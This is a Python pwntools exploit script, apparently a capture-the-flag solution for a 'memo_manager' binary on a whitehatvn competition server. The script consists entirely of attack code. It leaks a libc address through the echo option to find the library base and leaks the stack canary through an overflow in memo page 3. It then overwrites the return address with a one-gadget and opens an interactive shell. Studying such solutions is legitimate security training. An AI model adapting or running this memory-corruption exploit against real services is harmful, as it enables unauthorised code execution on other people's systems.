from pwn import *


def echo(data):
    r.recvuntil('Your choice:')
    r.send('1')
    r.recvuntil('What do you want to say:')
    r.send(data)
    r.recvuntil('You said: ')
    return r.recvline()

def store(index, data):
    r.recvuntil('Your choice:')
    r.send('2')
    r.recvuntil('Which one do you want to store in (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil("What do you want to store in mem page %d :" %index)
    r.send(data)


def show(index):
    r.recvuntil('Your choice:')
    r.send('3')
    r.recvuntil('Which memo page do you want to see (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil('memo page %d : ' %index)
    return r.recvline()


def edit(index, data):
    r.recvuntil('Your choice:')
    r.send('4')
    r.recvuntil('Which memo page do you want to edit (1 , 2 , 3)?:')
    r.send(str(index))
    r.recvuntil('Edit memo page 4 :')
    r.send(data)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
r = remote('memo-manager.grandprix.whitehatvn.com', 4598)
# r = process('./memo_manager')
# gdb.attach(r, "b*0x000555555554B78")

tmp = echo("a"*0x48).strip()+"\x00"*8
atoi = u64(tmp[0x48:0x50])-16
base = atoi - libc.symbols['atoi']
log.info("atoi: %#x" %atoi)
log.info("base: %#x" %base)
gadget = base + 0x45216
log.info("gadget: %#x" %gadget)

store(1, "a"*0x10)
store(2, "a"*0x10)
store(3, "a"*0x10)
edit(1,"a"*0x10)
edit(3, "a"*0x19)
tmp = "\x00"+show(3)[0x19:0x19+7]
canary = u64(tmp)
log.info("canary: %#x" %canary)
edit(3, "a"*0x10+"\x00")
edit(1, "a"*0x10)
edit(3, "a"*0x18+p64(canary)+p64(canary)+p64(gadget))
r.recvuntil('Your choice:')
r.send('5')
r.interactive()